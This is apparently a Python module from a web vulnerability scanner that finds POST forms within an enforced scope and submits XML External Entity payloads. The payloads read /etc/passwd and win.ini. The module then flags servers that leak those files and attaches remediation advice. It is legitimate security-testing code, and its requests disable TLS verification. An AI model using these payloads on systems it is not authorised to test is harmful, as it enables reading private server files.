import urllib.parse

import requests
from bs4 import BeautifulSoup

from crawler import Asset
from database import Vulnerability
from enforcer import ScopeEnforcer


class XXEScanner:
    """
    Finds POST forms that might accept XML and submits a raw XXE payload
    (Content-Type: application/xml) to see if the server resolves external
    entities and leaks local file contents.
    """

    PAYLOADS = [
        # Windows target
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<data>&xxe;</data>""",
        # Linux target
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>""",
    ]

    LINUX_MARKERS = ["root:", "daemon:"]
    WINDOWS_MARKERS = ["[extensions]", "fonts"]

    def __init__(self, enforcer: ScopeEnforcer):
        self.enforcer = enforcer

    def scan(self, assets: list[Asset]) -> list[Vulnerability]:
        print("\n[*] Starting XXE Injection Scanner...")
        vulnerabilities: list[Vulnerability] = []

        html_assets = [
            a for a in assets
            if a.get('is_html') or 'text/html' in a.get('headers', {}).get('Content-Type', '').lower()
        ]
        print(f"[*] Found {len(html_assets)} HTML pages to inspect for POST endpoints.")

        tested_urls: set[str] = set()

        for asset in html_assets:
            page_url = asset['url']

            is_allowed, _ = self.enforcer.check(page_url)
            if not is_allowed:
                continue

            try:
                response = requests.get(page_url, timeout=10, verify=False)
            except Exception:
                continue

            try:
                soup = BeautifulSoup(response.text, 'html.parser')
            except Exception:
                continue

            for form in soup.find_all('form'):
                method = (form.get('method') or 'get').strip().lower()  # type: ignore[union-attr]
                if method != 'post':
                    continue

                action = form.get('action') or page_url
                form_url: str = urllib.parse.urljoin(page_url, action)  # type: ignore[assignment,type-var]

                if form_url in tested_urls:
                    continue
                tested_urls.add(form_url)

                is_allowed, _ = self.enforcer.check(form_url)
                if not is_allowed:
                    continue

                if self._test_endpoint(form_url, vulnerabilities):
                    continue

        print(f"[*] XXE scan complete. Found {len(vulnerabilities)} vulnerabilities.")
        return self._deduplicate(vulnerabilities)

    def _test_endpoint(self, form_url: str, vulnerabilities: list[Vulnerability]) -> bool:
        for payload in self.PAYLOADS:
            print(f"    ↳ Testing XXE on: {form_url}")
            try:
                response = requests.post(
                    form_url,
                    data=payload.encode('utf-8'),
                    headers={"Content-Type": "application/xml"},
                    timeout=10,
                    verify=False,
                )
            except Exception as e:
                print(f"    ↳ [!] NETWORK ERROR: {e}")
                continue

            body_lower = response.text.lower()
            if any(marker in body_lower for marker in self.LINUX_MARKERS) or \
               any(marker in body_lower for marker in self.WINDOWS_MARKERS):
                vulnerabilities.append({
                    "type": "XML External Entity (XXE) Injection",
                    "severity": "CRITICAL",
                    "url": form_url,
                    "vulnerable_param": "XML Body",
                    "payload_used": payload,
                    "description": "The application processes XML input with external entity resolution enabled, allowing attackers to read local files, perform SSRF attacks, or cause denial of service.",
                    "remediation": "Disable external entity processing in XML parsers. Use defusedxml library instead of standard XML parsers. Never process untrusted XML input with entity resolution enabled."
                })
                return True

        return False

    def _deduplicate(self, vulns: list[Vulnerability]) -> list[Vulnerability]:
        seen: set[str] = set()
        unique_vulns: list[Vulnerability] = []
        for v in vulns:
            key = v['url']
            if key not in seen:
                seen.add(key)
                unique_vulns.append(v)
        return unique_vulns
